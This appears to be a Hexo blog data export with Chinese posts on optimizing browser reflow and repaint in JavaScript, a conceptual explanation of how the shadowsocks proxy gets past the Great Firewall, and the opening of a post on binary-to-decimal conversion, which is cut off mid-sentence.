title=\"批量读或者批量写\"></a>批量读或者批量写</h3><blockquote>\n<p>现代浏览器已经很智能，会把所有变动排在一起，然后一次性集中在一起，推入到一个队列然后再渲染，这样通过队列话修改然后批量执行可以优化重排过程。</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.stryle.color = <span class=\"string\">\"red\"</span>;</span><br><span class=\"line\">div.style.marginTop = <span class=\"string\">\"30px\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//这里不会是一次次变，而是只会触发一次重排和重绘</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//但是下面这样，就会触发两次重排和重绘</span></span><br><span class=\"line\">div.style.color = <span class=\"string\">\"blue\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> margin = <span class=\"built_in\">parseInt</span>(div.style.marginTop);</span><br><span class=\"line\">div.style.marginTop = margin + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//第二行中，我们读取该div的元素位置，这个时候浏览器这个队列马上就要推出去渲染，才可以得知新的布局的位置，所以浏览器必须要重排</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>由上可知，如果我们在写操作之后，再读会立即渲染，有以下读操作</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">offsetTop / offsetLeft / offsetWidth / offsetHeight;</span><br><span class=\"line\">scrollTop / scrollLeft / scrollWidth / scrollHeight;</span><br><span class=\"line\">clientTop / clientLeft / clientWidth / clientHeight;</span><br><span class=\"line\">getComputedStyle();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>所以我们要懂得批量读和批量写</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// bad</span></span><br><span class=\"line\">div.style.left = div.offsetLeft + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">div.style.top = div.offsetTop + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// good</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> left = div.offsetLeft;</span><br><span class=\"line\"><span class=\"keyword\">var</span> top = div.offsetTop;</span><br><span class=\"line\">div.style.left = left + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">div.style.top = top + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"合并样式操作\"><a href=\"#合并样式操作\" class=\"headerlink\" title=\"合并样式操作\"></a>合并样式操作</h3><blockquote>\n<p>尽管现代浏览器做了优化，但是旧的浏览器可能没有，所以我们应该尽可能合并对样式的修改</p>\n</blockquote>\n<ul>\n<li>cssText：el.style.cssText=’border-left: 1px; border-right: 2px; padding: 5px;’</li>\n<li>修改 className：如果不是那么依赖计算，可以通过修改 className</li>\n</ul>\n<h3 id=\"修改-dom-元素的时候使其脱离文档流\"><a href=\"#修改-dom-元素的时候使其脱离文档流\" class=\"headerlink\" title=\"修改 dom 元素的时候使其脱离文档流\"></a>修改 dom 元素的时候使其脱离文档流</h3><blockquote>\n<p>当我们需要对 dom 元素频繁操作的时候，我们可以这样减少重排和重绘</p>\n</blockquote>\n<ul>\n<li>让该 dom 元素脱离文档流（重排）</li>\n<li>操作元素</li>\n<li>完成后再添加到 document（重排）</li>\n</ul>\n<h4 id=\"如何脱离文档流\"><a href=\"#如何脱离文档流\" class=\"headerlink\" title=\"如何脱离文档流\"></a>如何脱离文档流</h4><ul>\n<li>隐藏元素：display:none，然后一系列操作后，再显示</li>\n<li>推荐：使用 document fragment，就是传说中的文档碎片了，document.createDocumentFragment()，另外的 dom 子树，操作完后，再拷贝回来文档中，div.appendChild（fragment）</li>\n<li>将原始元素拷贝到一个脱离文档的节点中，cloneNode,修改这个副本，然后再通过这个元素的父元素的 replaceChild 替换他</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> old = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"mylist\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> clone = old.cloneNode(<span class=\"literal\">true</span>);</span><br><span class=\"line\">appendDataToElement(clone, data);</span><br><span class=\"line\">old.parentNode.replaceChild(clone, old);</span><br></pre></td></tr></table></figure>\n<h3 id=\"缓存读过的样式结果\"><a href=\"#缓存读过的样式结果\" class=\"headerlink\" title=\"缓存读过的样式结果\"></a>缓存读过的样式结果</h3><ul>\n<li>div.style.top 读取可能会重排，这样最好这个缓存到变量里面，下次要用到这个就不用再读 div 的信息了</li>\n</ul>\n<h3 id=\"定位脱离文档流\"><a href=\"#定位脱离文档流\" class=\"headerlink\" title=\"定位脱离文档流\"></a>定位脱离文档流</h3><ul>\n<li>可以将要多次重排的元素，position 可以设置 abs 和 fixed，这样就脱离文档流，不会影响其他元素。</li>\n<li>有动画效果的可以设置为绝对定位</li>\n</ul>\n<h3 id=\"使用-window-requestAnimationFrame-、window-requestIdleCallback-重新渲染\"><a href=\"#使用-window-requestAnimationFrame-、window-requestIdleCallback-重新渲染\" class=\"headerlink\" title=\"使用 window.requestAnimationFrame()、window.requestIdleCallback() 重新渲染\"></a>使用 window.requestAnimationFrame()、window.requestIdleCallback() 重新渲染</h3>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><ul>\n<li>网页生成布局(重排 reflow)，页面绘制（重绘 repaint）一个个盒子元素<blockquote>\n<p>重排一定会引起重绘，重绘不一定引起重排</p>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>为什么这样说，如果我改变了布局，比如改变边框宽度或者给段落增加文字，浏览器需要重新计算元素的几何属性，就会重排，然后就会重新绘制</li>\n<li>但是如果改变元素的背景色，就只会发生重绘，而不会影响布局</li>\n<li>重绘和重排非常消耗资源，应该尽量避免</li>\n</ul>\n<h2 id=\"怎样优化\"><a href=\"#怎样优化\" class=\"headerlink\" title=\"怎样优化\"></a>怎样优化</h2><h3 id=\"批量读或者批量写\"><a href=\"#批量读或者批量写\" class=\"headerlink\" title=\"批量读或者批量写\"></a>批量读或者批量写</h3><blockquote>\n<p>现代浏览器已经很智能，会把所有变动排在一起，然后一次性集中在一起，推入到一个队列然后再渲染，这样通过队列话修改然后批量执行可以优化重排过程。</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.stryle.color = <span class=\"string\">\"red\"</span>;</span><br><span class=\"line\">div.style.marginTop = <span class=\"string\">\"30px\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//这里不会是一次次变，而是只会触发一次重排和重绘</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//但是下面这样，就会触发两次重排和重绘</span></span><br><span class=\"line\">div.style.color = <span class=\"string\">\"blue\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> margin = <span class=\"built_in\">parseInt</span>(div.style.marginTop);</span><br><span class=\"line\">div.style.marginTop = margin + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//第二行中，我们读取该div的元素位置，这个时候浏览器这个队列马上就要推出去渲染，才可以得知新的布局的位置，所以浏览器必须要重排</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>由上可知，如果我们在写操作之后，再读会立即渲染，有以下读操作</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">offsetTop / offsetLeft / offsetWidth / offsetHeight;</span><br><span class=\"line\">scrollTop / scrollLeft / scrollWidth / scrollHeight;</span><br><span class=\"line\">clientTop / clientLeft / clientWidth / clientHeight;</span><br><span class=\"line\">getComputedStyle();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>所以我们要懂得批量读和批量写</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// bad</span></span><br><span class=\"line\">div.style.left = div.offsetLeft + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">div.style.top = div.offsetTop + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// good</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> left = div.offsetLeft;</span><br><span class=\"line\"><span class=\"keyword\">var</span> top = div.offsetTop;</span><br><span class=\"line\">div.style.left = left + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">div.style.top = top + <span class=\"number\">10</span> + <span class=\"string\">\"px\"</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"合并样式操作\"><a href=\"#合并样式操作\" class=\"headerlink\" title=\"合并样式操作\"></a>合并样式操作</h3><blockquote>\n<p>尽管现代浏览器做了优化，但是旧的浏览器可能没有，所以我们应该尽可能合并对样式的修改</p>\n</blockquote>\n<ul>\n<li>cssText：el.style.cssText=’border-left: 1px; border-right: 2px; padding: 5px;’</li>\n<li>修改 className：如果不是那么依赖计算，可以通过修改 className</li>\n</ul>\n<h3 id=\"修改-dom-元素的时候使其脱离文档流\"><a href=\"#修改-dom-元素的时候使其脱离文档流\" class=\"headerlink\" title=\"修改 dom 元素的时候使其脱离文档流\"></a>修改 dom 元素的时候使其脱离文档流</h3><blockquote>\n<p>当我们需要对 dom 元素频繁操作的时候，我们可以这样减少重排和重绘</p>\n</blockquote>\n<ul>\n<li>让该 dom 元素脱离文档流（重排）</li>\n<li>操作元素</li>\n<li>完成后再添加到 document（重排）</li>\n</ul>\n<h4 id=\"如何脱离文档流\"><a href=\"#如何脱离文档流\" class=\"headerlink\" title=\"如何脱离文档流\"></a>如何脱离文档流</h4><ul>\n<li>隐藏元素：display:none，然后一系列操作后，再显示</li>\n<li>推荐：使用 document fragment，就是传说中的文档碎片了，document.createDocumentFragment()，另外的 dom 子树，操作完后，再拷贝回来文档中，div.appendChild（fragment）</li>\n<li>将原始元素拷贝到一个脱离文档的节点中，cloneNode,修改这个副本，然后再通过这个元素的父元素的 replaceChild 替换他</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> old = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"mylist\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> clone = old.cloneNode(<span class=\"literal\">true</span>);</span><br><span class=\"line\">appendDataToElement(clone, data);</span><br><span class=\"line\">old.parentNode.replaceChild(clone, old);</span><br></pre></td></tr></table></figure>\n<h3 id=\"缓存读过的样式结果\"><a href=\"#缓存读过的样式结果\" class=\"headerlink\" title=\"缓存读过的样式结果\"></a>缓存读过的样式结果</h3><ul>\n<li>div.style.top 读取可能会重排，这样最好这个缓存到变量里面，下次要用到这个就不用再读 div 的信息了</li>\n</ul>\n<h3 id=\"定位脱离文档流\"><a href=\"#定位脱离文档流\" class=\"headerlink\" title=\"定位脱离文档流\"></a>定位脱离文档流</h3><ul>\n<li>可以将要多次重排的元素，position 可以设置 abs 和 fixed，这样就脱离文档流，不会影响其他元素。</li>\n<li>有动画效果的可以设置为绝对定位</li>\n</ul>\n<h3 id=\"使用-window-requestAnimationFrame-、window-requestIdleCallback-重新渲染\"><a href=\"#使用-window-requestAnimationFrame-、window-requestIdleCallback-重新渲染\" class=\"headerlink\" title=\"使用 window.requestAnimationFrame()、window.requestIdleCallback() 重新渲染\"></a>使用 window.requestAnimationFrame()、window.requestIdleCallback() 重新渲染</h3>"},{"title":"shadowsocks了解一下","date":"2018-05-09T12:21:22.000Z","_content":"\n> 有时候需要科学上网，这个时候 ss 就大显身手了\n\n# 初步认识\n\n* ss 是一个能骗过防火墙的网络代理工具。把要传输的原数据经过加密后再传输，网络中的防火墙由于得不出要传输的内容是啥，就只好放行了。\n* 于是就完成了防火墙穿透，也就是所谓翻墙。\n\n### 网络环境\n\n* 自由的网络环境下 ，本机访问其他互联网服务建立连接传输数据的时候，直接 req 过去，res 回来\n* 但是一般情况下，会有 GFW。req 过去的数据和 res 回来的数据都必须通过 GFW 的检查。\n* 如果发现传输受限的内容，就会拦截本次传输，就会导致本机无法访问远程服务。\n\n### ss 做什么\n\n* ss 所做的就是把传输的数据加密，防火墙得到的数据是加密后的数据，如果想要破解加密数据可能经过大量运算，所以防火墙只好放弃。\n* 放行这个请求，本机就可以访问到了远程服务\n\n### ss 准备什么\n\n* 一台在 GFW 之外的服务器，ip 是国外的，比如（vultr 的 vps）\n* 在本机安装 ss 客户端，用于加密传输数据\n* 服务器需要安装 ss 服务端，用于解密加密的传输数据，然后再把揭秘后的原数据发送到目标服务器\n\n# 原理\n\n> 由两部分组成，运行在本地的 ss-local 和运行在 GFW 之外的服务器的 ss-server。\n\n### ss-local\n\n* 在本机启动和监听着一个服务，本地软件的网络请求都先发送到 ss-local，然后按照用户配置的加密方法和密码加密传输数据，再转发到墙外的 ss-server\n\n##### PAC 代理模式和全局代理模式\n\n* pac 模式是访问网站先匹配 pac list，如果有在里面才会访问，否则直接连接访问网站\n* 节省 ss 流量，提高国内的访问速度\n\n### ss-server\n\n* 在墙外服务器启动和监听一个服务，监听 ss-local 的请求。\n* 收到 ss-local 转发过来的数据后，会先根据用户配置的加密方法和密码对数据进行对称揭秘，以获得加密后的数据的原内容。\n* 同时还会解析 socks5 协议，读出本次请求真正的目标服务地址（例如 facebook，google 服务器地址），再把解密后的数据发过去\n* 当真正的目标服务返回了数据，比如谷歌返回了页面，ss-server 会把返回的数据加密返回给 ss-local。ss-local 收到数据后再解密，发给本机的软件。\n* 这是一个对称相反的过程。\n  * ss-local 和 ss-server 都需要用对称加密算法对数据进行加密和解密，因此这两端的加密方法和密码必须配置为一样。\n  * ss 提供一系列的标准可靠的对称算法供用户选择。如 rc4,aes,does。\n  * 对数据加密后再传输的目的是为了混淆原数据，让途中的防火墙无法算出传输的原数据。\n\n# chrome 下 SwitchyOmega 配合使用\n\n* 下载 SwitchyOmega 插件，勾选系统代理，将流量全部转给 ss-local\n\n# 推荐阅读\n\n* 本文节选自[从零开始写一个 shadowsocks](https://segmentfault.com/a/1190000011862912)\n* [自建 ss 服务教程](https://github.com/Austin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B)\n* [科学上网原理](http://blog.021xt.cc/archives/85)\n","source":"_posts/ss.md","raw":"---\ntitle: shadowsocks了解一下\ndate: 2018-05-09 20:21:22\ntags: 计算机基础\n---\n\n> 有时候需要科学上网，这个时候 ss 就大显身手了\n\n# 初步认识\n\n* ss 是一个能骗过防火墙的网络代理工具。把要传输的原数据经过加密后再传输，网络中的防火墙由于得不出要传输的内容是啥，就只好放行了。\n* 于是就完成了防火墙穿透，也就是所谓翻墙。\n\n### 网络环境\n\n* 自由的网络环境下 ，本机访问其他互联网服务建立连接传输数据的时候，直接 req 过去，res 回来\n* 但是一般情况下，会有 GFW。req 过去的数据和 res 回来的数据都必须通过 GFW 的检查。\n* 如果发现传输受限的内容，就会拦截本次传输，就会导致本机无法访问远程服务。\n\n### ss 做什么\n\n* ss 所做的就是把传输的数据加密，防火墙得到的数据是加密后的数据，如果想要破解加密数据可能经过大量运算，所以防火墙只好放弃。\n* 放行这个请求，本机就可以访问到了远程服务\n\n### ss 准备什么\n\n* 一台在 GFW 之外的服务器，ip 是国外的，比如（vultr 的 vps）\n* 在本机安装 ss 客户端，用于加密传输数据\n* 服务器需要安装 ss 服务端，用于解密加密的传输数据，然后再把揭秘后的原数据发送到目标服务器\n\n# 原理\n\n> 由两部分组成，运行在本地的 ss-local 和运行在 GFW 之外的服务器的 ss-server。\n\n### ss-local\n\n* 在本机启动和监听着一个服务，本地软件的网络请求都先发送到 ss-local，然后按照用户配置的加密方法和密码加密传输数据，再转发到墙外的 ss-server\n\n##### PAC 代理模式和全局代理模式\n\n* pac 模式是访问网站先匹配 pac list，如果有在里面才会访问，否则直接连接访问网站\n* 节省 ss 流量，提高国内的访问速度\n\n### ss-server\n\n* 在墙外服务器启动和监听一个服务，监听 ss-local 的请求。\n* 收到 ss-local 转发过来的数据后，会先根据用户配置的加密方法和密码对数据进行对称揭秘，以获得加密后的数据的原内容。\n* 同时还会解析 socks5 协议，读出本次请求真正的目标服务地址（例如 facebook，google 服务器地址），再把解密后的数据发过去\n* 当真正的目标服务返回了数据，比如谷歌返回了页面，ss-server 会把返回的数据加密返回给 ss-local。ss-local 收到数据后再解密，发给本机的软件。\n* 这是一个对称相反的过程。\n  * ss-local 和 ss-server 都需要用对称加密算法对数据进行加密和解密，因此这两端的加密方法和密码必须配置为一样。\n  * ss 提供一系列的标准可靠的对称算法供用户选择。如 rc4,aes,does。\n  * 对数据加密后再传输的目的是为了混淆原数据，让途中的防火墙无法算出传输的原数据。\n\n# chrome 下 SwitchyOmega 配合使用\n\n* 下载 SwitchyOmega 插件，勾选系统代理，将流量全部转给 ss-local\n\n# 推荐阅读\n\n* 本文节选自[从零开始写一个 shadowsocks](https://segmentfault.com/a/1190000011862912)\n* [自建 ss 服务教程](https://github.com/Austin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B)\n* [科学上网原理](http://blog.021xt.cc/archives/85)\n","slug":"ss","published":1,"updated":"2018-06-13T06:45:46.547Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k400100iofgmmh7m3m","content":"<blockquote>\n<p>有时候需要科学上网，这个时候 ss 就大显身手了</p>\n</blockquote>\n<h1 id=\"初步认识\"><a href=\"#初步认识\" class=\"headerlink\" title=\"初步认识\"></a>初步认识</h1><ul>\n<li>ss 是一个能骗过防火墙的网络代理工具。把要传输的原数据经过加密后再传输，网络中的防火墙由于得不出要传输的内容是啥，就只好放行了。</li>\n<li>于是就完成了防火墙穿透，也就是所谓翻墙。</li>\n</ul>\n<h3 id=\"网络环境\"><a href=\"#网络环境\" class=\"headerlink\" title=\"网络环境\"></a>网络环境</h3><ul>\n<li>自由的网络环境下 ，本机访问其他互联网服务建立连接传输数据的时候，直接 req 过去，res 回来</li>\n<li>但是一般情况下，会有 GFW。req 过去的数据和 res 回来的数据都必须通过 GFW 的检查。</li>\n<li>如果发现传输受限的内容，就会拦截本次传输，就会导致本机无法访问远程服务。</li>\n</ul>\n<h3 id=\"ss-做什么\"><a href=\"#ss-做什么\" class=\"headerlink\" title=\"ss 做什么\"></a>ss 做什么</h3><ul>\n<li>ss 所做的就是把传输的数据加密，防火墙得到的数据是加密后的数据，如果想要破解加密数据可能经过大量运算，所以防火墙只好放弃。</li>\n<li>放行这个请求，本机就可以访问到了远程服务</li>\n</ul>\n<h3 id=\"ss-准备什么\"><a href=\"#ss-准备什么\" class=\"headerlink\" title=\"ss 准备什么\"></a>ss 准备什么</h3><ul>\n<li>一台在 GFW 之外的服务器，ip 是国外的，比如（vultr 的 vps）</li>\n<li>在本机安装 ss 客户端，用于加密传输数据</li>\n<li>服务器需要安装 ss 服务端，用于解密加密的传输数据，然后再把揭秘后的原数据发送到目标服务器</li>\n</ul>\n<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><blockquote>\n<p>由两部分组成，运行在本地的 ss-local 和运行在 GFW 之外的服务器的 ss-server。</p>\n</blockquote>\n<h3 id=\"ss-local\"><a href=\"#ss-local\" class=\"headerlink\" title=\"ss-local\"></a>ss-local</h3><ul>\n<li>在本机启动和监听着一个服务，本地软件的网络请求都先发送到 ss-local，然后按照用户配置的加密方法和密码加密传输数据，再转发到墙外的 ss-server</li>\n</ul>\n<h5 id=\"PAC-代理模式和全局代理模式\"><a href=\"#PAC-代理模式和全局代理模式\" class=\"headerlink\" title=\"PAC 代理模式和全局代理模式\"></a>PAC 代理模式和全局代理模式</h5><ul>\n<li>pac 模式是访问网站先匹配 pac list，如果有在里面才会访问，否则直接连接访问网站</li>\n<li>节省 ss 流量，提高国内的访问速度</li>\n</ul>\n<h3 id=\"ss-server\"><a href=\"#ss-server\" class=\"headerlink\" title=\"ss-server\"></a>ss-server</h3><ul>\n<li>在墙外服务器启动和监听一个服务，监听 ss-local 的请求。</li>\n<li>收到 ss-local 转发过来的数据后，会先根据用户配置的加密方法和密码对数据进行对称揭秘，以获得加密后的数据的原内容。</li>\n<li>同时还会解析 socks5 协议，读出本次请求真正的目标服务地址（例如 facebook，google 服务器地址），再把解密后的数据发过去</li>\n<li>当真正的目标服务返回了数据，比如谷歌返回了页面，ss-server 会把返回的数据加密返回给 ss-local。ss-local 收到数据后再解密，发给本机的软件。</li>\n<li>这是一个对称相反的过程。<ul>\n<li>ss-local 和 ss-server 都需要用对称加密算法对数据进行加密和解密，因此这两端的加密方法和密码必须配置为一样。</li>\n<li>ss 提供一系列的标准可靠的对称算法供用户选择。如 rc4,aes,does。</li>\n<li>对数据加密后再传输的目的是为了混淆原数据，让途中的防火墙无法算出传输的原数据。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"chrome-下-SwitchyOmega-配合使用\"><a href=\"#chrome-下-SwitchyOmega-配合使用\" class=\"headerlink\" title=\"chrome 下 SwitchyOmega 配合使用\"></a>chrome 下 SwitchyOmega 配合使用</h1><ul>\n<li>下载 SwitchyOmega 插件，勾选系统代理，将流量全部转给 ss-local</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li>本文节选自<a href=\"https://segmentfault.com/a/1190000011862912\" target=\"_blank\" rel=\"noopener\">从零开始写一个 shadowsocks</a></li>\n<li><a href=\"https://github.com/Austin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B\" target=\"_blank\" rel=\"noopener\">自建 ss 服务教程</a></li>\n<li><a href=\"http://blog.021xt.cc/archives/85\" target=\"_blank\" rel=\"noopener\">科学上网原理</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>有时候需要科学上网，这个时候 ss 就大显身手了</p>\n</blockquote>\n<h1 id=\"初步认识\"><a href=\"#初步认识\" class=\"headerlink\" title=\"初步认识\"></a>初步认识</h1><ul>\n<li>ss 是一个能骗过防火墙的网络代理工具。把要传输的原数据经过加密后再传输，网络中的防火墙由于得不出要传输的内容是啥，就只好放行了。</li>\n<li>于是就完成了防火墙穿透，也就是所谓翻墙。</li>\n</ul>\n<h3 id=\"网络环境\"><a href=\"#网络环境\" class=\"headerlink\" title=\"网络环境\"></a>网络环境</h3><ul>\n<li>自由的网络环境下 ，本机访问其他互联网服务建立连接传输数据的时候，直接 req 过去，res 回来</li>\n<li>但是一般情况下，会有 GFW。req 过去的数据和 res 回来的数据都必须通过 GFW 的检查。</li>\n<li>如果发现传输受限的内容，就会拦截本次传输，就会导致本机无法访问远程服务。</li>\n</ul>\n<h3 id=\"ss-做什么\"><a href=\"#ss-做什么\" class=\"headerlink\" title=\"ss 做什么\"></a>ss 做什么</h3><ul>\n<li>ss 所做的就是把传输的数据加密，防火墙得到的数据是加密后的数据，如果想要破解加密数据可能经过大量运算，所以防火墙只好放弃。</li>\n<li>放行这个请求，本机就可以访问到了远程服务</li>\n</ul>\n<h3 id=\"ss-准备什么\"><a href=\"#ss-准备什么\" class=\"headerlink\" title=\"ss 准备什么\"></a>ss 准备什么</h3><ul>\n<li>一台在 GFW 之外的服务器，ip 是国外的，比如（vultr 的 vps）</li>\n<li>在本机安装 ss 客户端，用于加密传输数据</li>\n<li>服务器需要安装 ss 服务端，用于解密加密的传输数据，然后再把揭秘后的原数据发送到目标服务器</li>\n</ul>\n<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><blockquote>\n<p>由两部分组成，运行在本地的 ss-local 和运行在 GFW 之外的服务器的 ss-server。</p>\n</blockquote>\n<h3 id=\"ss-local\"><a href=\"#ss-local\" class=\"headerlink\" title=\"ss-local\"></a>ss-local</h3><ul>\n<li>在本机启动和监听着一个服务，本地软件的网络请求都先发送到 ss-local，然后按照用户配置的加密方法和密码加密传输数据，再转发到墙外的 ss-server</li>\n</ul>\n<h5 id=\"PAC-代理模式和全局代理模式\"><a href=\"#PAC-代理模式和全局代理模式\" class=\"headerlink\" title=\"PAC 代理模式和全局代理模式\"></a>PAC 代理模式和全局代理模式</h5><ul>\n<li>pac 模式是访问网站先匹配 pac list，如果有在里面才会访问，否则直接连接访问网站</li>\n<li>节省 ss 流量，提高国内的访问速度</li>\n</ul>\n<h3 id=\"ss-server\"><a href=\"#ss-server\" class=\"headerlink\" title=\"ss-server\"></a>ss-server</h3><ul>\n<li>在墙外服务器启动和监听一个服务，监听 ss-local 的请求。</li>\n<li>收到 ss-local 转发过来的数据后，会先根据用户配置的加密方法和密码对数据进行对称揭秘，以获得加密后的数据的原内容。</li>\n<li>同时还会解析 socks5 协议，读出本次请求真正的目标服务地址（例如 facebook，google 服务器地址），再把解密后的数据发过去</li>\n<li>当真正的目标服务返回了数据，比如谷歌返回了页面，ss-server 会把返回的数据加密返回给 ss-local。ss-local 收到数据后再解密，发给本机的软件。</li>\n<li>这是一个对称相反的过程。<ul>\n<li>ss-local 和 ss-server 都需要用对称加密算法对数据进行加密和解密，因此这两端的加密方法和密码必须配置为一样。</li>\n<li>ss 提供一系列的标准可靠的对称算法供用户选择。如 rc4,aes,does。</li>\n<li>对数据加密后再传输的目的是为了混淆原数据，让途中的防火墙无法算出传输的原数据。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"chrome-下-SwitchyOmega-配合使用\"><a href=\"#chrome-下-SwitchyOmega-配合使用\" class=\"headerlink\" title=\"chrome 下 SwitchyOmega 配合使用\"></a>chrome 下 SwitchyOmega 配合使用</h1><ul>\n<li>下载 SwitchyOmega 插件，勾选系统代理，将流量全部转给 ss-local</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li>本文节选自<a href=\"https://segmentfault.com/a/1190000011862912\" target=\"_blank\" rel=\"noopener\">从零开始写一个 shadowsocks</a></li>\n<li><a href=\"https://github.com/Austin9999/new-pac/wiki/%E8%87%AA%E5%BB%BAss%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%99%E7%A8%8B\" target=\"_blank\" rel=\"noopener\">自建 ss 服务教程</a></li>\n<li><a href=\"http://blog.021xt.cc/archives/85\" target=\"_blank\" rel=\"noopener\">科学上网原理</a></li>\n</ul>\n"},{"title":"了解二进制转换","date":"2018-05-03T14:46:38.000Z","_content":"\n> 十进制是为了人们方便记忆使用的，而计算机的世界里只有 0 和 1，也就是只有二进制\n\n## 二进制\n\n* 想要了解计算机，首先要了解二进制\n\n> 以下来自维基百科\n\n二进制（binary）数是指用二进制记数系统，即以 2 为基数的记数系统表示的数字。这一系统中，通常用两个不同的符号 0（代表零）和 1（代表一）来表示。以 2 为基数代表系统是二进位制的。数字电子电路中，逻辑门的实现直接应用了二进制，因此现代的计算机和依赖计算机的设备里都用到二进制。每个数字称为一个位元（二进制位）或比特（Bit，Binary digit 的缩写）\n\n## 二进制转换成十进制\n\n> 以 2 为底数，指数是权重（换句话说是位数-1，权重从 0 开始）\n\n* 例如：11=>1*2^1+1*2\b^0=3\n\n## 十进制转换成二进制\n\n> 每一步除以进制数（2），直到商数为 0，然后取每一步的余数，再倒过来就是了\n\n* 例如 10=>10/2=5 余 0,5/2=2 余 1，2/2=1 余 0，1/2=0 余 1,然后再取倒就是 1010\n\n> 如果是有小数的，比如 10.25,那么小数部分乘以 2，取它整数部分的结果，然后再用这个结果继续乘以 